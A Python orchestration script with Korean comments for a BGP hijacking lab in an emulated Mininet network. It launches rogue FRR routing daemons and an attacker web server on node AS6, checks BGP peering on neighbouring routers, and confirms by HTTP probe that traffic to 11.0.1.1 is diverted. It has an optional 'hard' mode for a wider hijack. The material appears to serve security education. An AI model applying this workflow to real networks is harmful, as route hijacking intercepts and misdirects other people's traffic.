#!/usr/bin/env python3
# BGP Hijacking 오케스트레이터 (검증/관찰/하드모드 전환 지원)
# - start_rogue.sh 성공 판정(--verify-start)
# - BGP 피어/포트/데이터 평면까지 종합 확인
# - hostname이 'mininet'으로 고정되는 환경 허용
# - netcat/vtysh 폴백, 디코딩 에러 무해화

import argparse
import shlex
import subprocess
import sys
import time
from typing import Tuple, List

# ------------------------------
# 셸 실행 유틸
# ------------------------------
def run_local(cmd: str, capture: bool = True) -> Tuple[int, str, str]:
    """호스트 셸에서 명령 실행 (디코딩 오류 안전 처리)"""
    if capture:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, errors='replace', stdin=subprocess.DEVNULL)
        return proc.returncode, proc.stdout.strip(), proc.stderr.strip()
    else:
        rc = subprocess.call(cmd, shell=True)
        return rc, "", ""

def run_node_raw(node: str, cmd: str) -> Tuple[int, str, str]:
    """sudo python3 run.py --node <node> --cmd "<cmd>" 호출 (원형)"""
    quoted = shlex.quote(cmd)
    full = f"sudo -n python3 run.py --node {shlex.quote(node)} --cmd {quoted}"
    return run_local(full, capture=True)

def run_node(node: str, cmd: str) -> Tuple[int, str, str]:
    """run.py 네임스페이스 매핑 경고"""
    rc_h, out_h, _ = run_node_raw(node, "hostname || true")
    if out_h:
        hn = out_h.strip()
        if hn not in (node, "mininet"):
            print(f"[경고] run.py가 '{node}' 대신 '{hn}' 네임스페이스에 붙은 것 같습니다.", file=sys.stderr)
    return run_node_raw(node, cmd)

def print_header(title: str):
    bar = "=" * len(title)
    print(f"\n{bar}\n{title}\n{bar}")

def print_block(title: str, body: str):
    print_header(title)
    print(body if body else "(출력 없음)")

# ------------------------------
# 동작 함수
# ------------------------------
def start_attacker_processes() -> None:
    """R6 zebra/bgpd 기동 + h6-1 공격자 웹서버 기동 (이미 떠 있으면 통과)"""
    print_header("R6: FRR 데몬 및 h6-1 웹서버 기동")

    # logs 디렉터리 보장
    run_local("mkdir -p logs || true", capture=False)

    # R6 zebra/bgpd (재기동 안전)
    run_node("R6", "pkill -9 -f '/usr/lib/frr/bgpd.*bgpd-R6\\.conf' >/dev/null 2>&1 || true")
    run_node("R6", "pkill -9 -f '/usr/lib/frr/zebra.*zebra-R6\\.conf' >/dev/null 2>&1 || true")
    cmds = [
        "/usr/lib/frr/zebra -f conf/zebra-R6.conf -d -i /tmp/zebra-R6.pid > logs/R6-zebra-stdout 2>&1",
        "/usr/lib/frr/bgpd  -f conf/bgpd-R6.conf  -d -i /tmp/bgpd-R6.pid  > logs/R6-bgpd-stdout  2>&1",
    ]
    for c in cmds:
        run_node("R6", c + " || true")

    # h6-1 웹서버
    rc, out, _ = run_node("h6-1", "ps aux | grep '[w]ebserver.py' || true")
    if not out:
        run_node("h6-1", "python3 webserver.py --text '*** Attacker web server (AS6) ***' >/dev/null 2>&1 &")
        print("h6-1: webserver started.")
    else:
        print("h6-1: webserver already running.")

def check_r6_status() -> None:
    rc, out, err = run_node("R6", "ss -tnlp | egrep ':179\\s' || true")
    print_block("R6: TCP/179 리스너", out or err)

    rc, out, err = run_node("R6", "ps -eo pid,cmd | egrep '/usr/lib/frr/(zebra|bgpd)\\b' || true")
    print_block("R6: FRR 프로세스(명령행 기준)", out or err)

def _run_vtysh_or_netcat(node: str, vty_cmd: str) -> Tuple[int, str, str]:
    """
    vtysh가 있으면 vtysh -c로 실행, 실패 시 VTY 포트(127.0.0.1:2605)에 netcat으로 연결.
    """
    rc, out, err = run_node(node, f'vtysh -c {shlex.quote(vty_cmd)} || true')
    if out.strip():
        return rc, out, err

    # netcat 폴백
    payload = vty_cmd + "\nexit\n"
    nc_cmds = [
        "printf " + shlex.quote(payload) + " | nc -w1 -N 127.0.0.1 2605 || true",
        "printf " + shlex.quote(payload) + " | nc -w1 -q 0 127.0.0.1 2605 || true",
    ]
    for nc in nc_cmds:
        rc2, out2, err2 = run_node(node, nc)
        if out2.strip():
            return rc2, out2, err2
    return rc, out, err

def bgp_summary(nodes: List[str]) -> None:
    """각 노드에서 'show ip bgp summary' 실행"""
    for n in nodes:
        title = f"{n}: show ip bgp summary"
        rc, out, err = _run_vtysh_or_netcat(n, "show ip bgp summary")
        if out.strip():
            print_block(title, out)
        else:
            rc2, out2, err2 = run_node(n, f"tail -n 40 /tmp/{n}-bgpd.log || true")
            msg = out2 if out2 else (err or err2 or "(vtysh 출력/로그 모두 없음)")
            print_block(f"{title} (fallback: tail bgpd.log)", msg)

def http_probe(node: str, target_ip: str = "11.0.1.1", timeout: int = 4) -> str:
    cmd = f"curl -s --max-time {timeout} http://{target_ip} || true"
    rc, out, err = run_node(node, cmd)
    return (out or "").strip()

def show_http_checks(nodes: List[str], target_ip: str = "11.0.1.1"):
    lines = []
    for n in nodes:
        body = http_probe(n, target_ip=target_ip)
        if not body:
            lines.append(f"[{n}] (응답 없음)")
        else:
            snippet = body if len(body) <= 160 else body[:160] + "..."
            lines.append(f"[{n}] {snippet}")
    print_block(f"HTTP GET 결과 (→ http://{target_ip})", "\n".join(lines))

def switch_to_hard_mode() -> None:
    print_header("R6: 고급(hard) 공격 전환")
    run_node("R6", "pkill -9 -f '/usr/lib/frr/bgpd.*bgpd-R6\\.conf' || true")
    rc, out, err = run_node(
        "R6",
        "/usr/lib/frr/bgpd -f conf/bgpd-R6-hard.conf -d -i /tmp/bgpd-R6.pid > logs/R6-bgpd-hard-stdout 2>&1"
    )
    if err:
        print(err)

def tail_logs(nodes: List[str], lines: int = 30):
    for n in nodes:
        rc, out, err = run_node(n, f"tail -n {lines} /tmp/{n}-bgpd.log || true")
        print_block(f"{n}: bgpd 로그 tail (-{lines})", out or err)

# ------------------------------
# start_rogue.sh 성공 판정
# ------------------------------
def _peer_line_ok(line: str) -> bool:
    """Established or PfxRcd>=1"""
    s = line.strip()
    if not s:
        return False
    if "Estab" in s or "Established" in s:
        return True
    toks = s.split()
    if toks:
        try:
            last = int(toks[-1])
            return last >= 1
        except ValueError:
            pass
    return False

def verify_start_rogue() -> int:
    ok = True

    print_header("[검증] 1) R6 bgpd/zebra conf로 기동?")
    rc, out, err = run_node("R6", "ps -eo pid,cmd | egrep '/usr/lib/frr/(bgpd|zebra).*R6\\.conf' || true")
    if not out.strip():
        rc2, out2, err2 = run_node("R6", "ps -eo pid,cmd | egrep '/usr/lib/frr/(bgpd|zebra)\\b' || true")
        print(out2 or err2 or "(없음)")
        print("  → R6 데몬이 기대한 conf로 뜨는지 확신 불가.")
        ok = False
    else:
        print(out)

    print_header("[검증] 2) R6의 TCP/179 리스너 존재?")
    rc, out, err = run_node("R6", "ss -tnlp | egrep ':179\\s' || true")
    print(out or err or "(없음)")
    if not out.strip():
        print("  → 179 리스너 미확인.")
        ok = False

    print_header("[검증] 3) R3/R5에서 R6 피어 Established/PfxRcd≥1?")
    established_all = True
    wants = [("R3", "9.0.7.2"), ("R5", "9.0.8.2")]
    for n, nei in wants:
        rc, out, err = _run_vtysh_or_netcat(n, "show ip bgp summary")
        print_block(f"{n}: show ip bgp summary", out or err)
        line = ""
        for l in (out or "").splitlines():
            if l.strip().startswith(nei):
                line = l
                break
        if not line or not _peer_line_ok(line):
            established_all = False
    if not established_all:
        print("  → 최소 하나가 Established/PfxRcd≥1 아님.")
        ok = False

    print_header("[검증] 4) 데이터 평면: h5-1 → 11.0.1.1 공격자 배너?")
    body = http_probe("h5-1", target_ip="11.0.1.1", timeout=3)
    print(body or "(응답 없음)")
    if "*** Attacker web server (AS6) ***" not in (body or ""):
        print("  → 아직 하이재킹 응답 아님(수렴 대기 필요 또는 실패).")
        ok = False

    print_header("[검증] 판정")
    print("결과:", "성공 ✅" if ok else "실패 ❌")
    return 0 if ok else 1

# ------------------------------
# 메인
# ------------------------------
def main():
    ap = argparse.ArgumentParser(description="BGP Hijacking Orchestrator")
    ap.add_argument("--hard", action="store_true", help="고급(전역) 공격까지 수행")
    ap.add_argument("--only-hard", dest="only_hard", action="store_true", help="바로 hard 모드만 수행")
    ap.add_argument("--no-start", action="store_true", help="데몬/웹서버 기동 생략 (점검만)")
    ap.add_argument("--wait", type=int, default=10, help="BGP 수렴 대기 시간(초, 기본 10)")
    ap.add_argument("--verify-start", action="store_true", help="start_rogue.sh 성공 여부만 검증 후 종료")
    args = ap.parse_args()

    print_header("전제: Mininet 토폴로지가 이미 올라와 있어야 합니다 (start_topology.py 실행).")
    print("※ 본 스크립트는 'run.py'를 sudo로 호출합니다.\n")

    if args.verify_start:
        time.sleep(max(1, args.wait))
        sys.exit(verify_start_rogue())

    if not args.no_start and not args.only_hard:
        start_attacker_processes()
    elif args.only_hard:
        # hard 바로 돌릴 때도 웹서버는 보장
        rc, out, _ = run_node("h6-1", "ps aux | grep '[w]ebserver.py' || true")
        if not out:
            run_node("h6-1", "python3 webserver.py --text '*** Attacker web server (AS6) ***' >/dev/null 2>&1 &")

    check_r6_status()
    bgp_summary(["R2", "R3", "R5"])

    print_header("기본 응답(공격 전 또는 초기 수렴 확인)")
    print(f"{args.wait}초 대기 후 HTTP 체크를 진행합니다...")
    time.sleep(max(1, args.wait))
    show_http_checks(["h5-1"], target_ip="11.0.1.1")

    if args.hard or args.only_hard:
        switch_to_hard_mode()
        print(f"{args.wait}초 대기 (hard 모드 수렴 중)...")
        time.sleep(max(1, args.wait))
        show_http_checks(["h1-1", "h2-1", "h3-1", "h4-1", "h5-1"], target_ip="11.0.1.1")
    else:
        print("\n(--hard 미지정: hard 모드 전환 생략)")

    tail_logs(["R5"], lines=40)

    print_header("완료")
    print("• 출력으로 피어 수립/수렴 여부와 공격 관찰을 판단하실 수 있습니다.")
    print("• 필요 시 --hard 옵션으로 전역 공격을 확인해 보세요.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n중단되었습니다.")